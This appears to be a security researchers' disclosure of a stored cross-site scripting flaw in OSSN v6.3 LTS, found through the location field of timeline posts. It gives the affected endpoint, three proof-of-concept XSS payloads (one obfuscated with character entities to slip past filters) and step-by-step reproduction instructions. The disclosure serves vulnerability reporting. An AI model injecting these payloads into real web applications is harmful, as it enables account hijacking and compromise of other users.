# OSSN-v6.3-LTS_Vuln2
OSSN - OPEN SOURCE SOCIAL NETWORK v6.3 LTS has Stored XSS Vulnerabilities


### Vulnerability Explanation:
OSSN v6.3 LTS has XSS vulnerabilities that allow attackers to store XSS via location input after posting to `Users Timeline`.

### Affected: 
1. http://ip_address:port/ossn/u/{username}

2. POST /ossn/action/wall/post/u?ossn_ts=1656419317&ossn_token=580bcf1b98fec62baecd2e15b7c4c03173f59226623258b968a316f893e8cbf1 

### Payload :
1. `<img/&#09;&#10;&#11; src=~ onerror=prompt('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

2. `<BODY ONLOAD=alert('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

3. `<img src=x onerror=confirm('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

### Tested on: 
1. OSSN v6.3 LTS (https://github.com/opensource-socialnetwork/opensource-socialnetwork/releases/tag/6.3)

2. Google Chrome Version 102.0.5005.115 (Official Build) (x86_64)

### Steps to attack:
1. Login with username and password. (If you don't have an account, you can register)
2. Go to "Users Timeline" by clicking on their username in the top left corner.
3. Enter data in the data entry form.
4. Click on the location button and enter the XSS payload.
5. The XSS payload will run immediately.

### Author:
Grim The Ripper Team by SOSECURE Thailand
